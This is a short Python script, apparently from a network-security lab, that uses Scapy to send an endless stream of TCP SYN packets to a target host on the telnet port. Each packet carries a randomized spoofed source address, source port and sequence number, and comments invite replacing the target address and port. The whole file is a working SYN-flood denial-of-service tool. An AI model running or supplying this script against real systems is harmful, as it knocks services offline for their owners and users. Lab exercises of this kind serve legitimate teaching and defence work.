from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")  # Replace with the target IP address
tcp = TCP(dport=23, flags="S")  # Replace with the target port number
pkt=ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # Randomize source IP address
    pkt[TCP].sport = getrandbits(16)  # Randomize source port number
    pkt[TCP].seq = getrandbits(32)  # Randomize sequence number
    send(pkt, verbose=0)  # Send the packet without verbose output
